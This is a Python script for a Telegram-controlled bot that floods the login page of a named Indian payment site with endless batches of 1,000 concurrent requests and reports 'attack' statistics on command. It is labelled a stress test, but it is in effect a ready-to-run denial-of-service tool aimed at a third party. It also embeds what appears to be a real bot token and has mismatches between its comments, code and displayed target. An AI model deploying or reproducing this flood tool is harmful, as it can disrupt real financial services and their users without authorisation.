import asyncio
import aiohttp
from telebot.async_telebot import AsyncTeleBot

# ==========================================
# CONFIGURATION
# ==========================================
BOT_TOKEN = "8607797493:AAEUFBnLIlB-UFvmsb3mMXSP1dtFFGPOGww"  # Apna bot token yahan dalein
TARGET_URL = "https://www.elitepay.co.in/login"

bot = AsyncTeleBot(BOT_TOKEN)

# Global stats tracking
stats = {
    "total_sent": 0,
    "success_200": 0,
    "rate_limited_429": 0,
    "other_errors": 0,
    "last_status": "Starting...",
    "last_preview": "None"
}

# Single Request Worker
async def fire_request(session):
    global stats
    try:
        async with session.get(TARGET_URL, timeout=aiohttp.ClientTimeout(total=5)) as response:
            text = await response.text()
            stats["total_sent"] += 1
            stats["last_status"] = str(response.status)
            stats["last_preview"] = (text[:60] + '..') if len(text) > 60 else text.strip()

            if response.status == 200:
                stats["success_200"] += 1
            elif response.status == 429:
                stats["rate_limited_429"] += 1
            else:
                stats["other_errors"] += 1
    except Exception as e:
        stats["total_sent"] += 1
        stats["other_errors"] += 1
        stats["last_status"] = "ERR"
        stats["last_preview"] = str(e)[:40]

# High-Speed Infinite Loop (Zero Sleep)
async def continuous_flood_worker():
    batch_size = 1000
    connector = aiohttp.TCPConnector(limit=2000, limit_per_host=200)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            # 50 requests parallel fire hongi
            tasks = [fire_request(session) for _ in range(batch_size)]
            await asyncio.gather(*tasks)
            
            # Event loop choke na hone ke liye micro-yield (0.001s)
            await asyncio.sleep(0.001)

# /start Command
@bot.message_handler(commands=['start'])
async def handle_start(message):
    welcome_text = (
        "⚡ **Stress Test Bot Running**\n\n"
        "Commands:\n"
        "➔ `/status` - Live request count aur response check karne ke liye."
    )
    await bot.reply_to(message, welcome_text, parse_mode='Markdown')

# /status Command
@bot.message_handler(commands=['status'])
async def handle_status(message):
    status_text = (
        "📊 **Live Attack / Stress Stats**\n\n"
        f"🎯 **Target:** `ultra-pay.in`\n"
        f"🚀 **Total Hits Sent:** `{stats['total_sent']}`\n"
        f"✅ **Success (200):** `{stats['success_200']}`\n"
        f"🚫 **Rate-Limited (429):** `{stats['rate_limited_429']}`\n"
        f"⚠️ **Errors/Other:** `{stats['other_errors']}`\n\n"
        f"📡 **Last Status:** `{stats['last_status']}`\n"
        f"📝 **Latest Response:** `{stats['last_preview']}`"
    )
    await bot.reply_to(message, status_text, parse_mode='Markdown')

async def main():
    print("Zero-Delay Continuous Loop Started on Railway...")
    # Background infinite loop start
    asyncio.create_task(continuous_flood_worker())
    
    # Telegram polling
    await bot.polling(non_stop=True)

if __name__ == "__main__":
    asyncio.run(main())
    
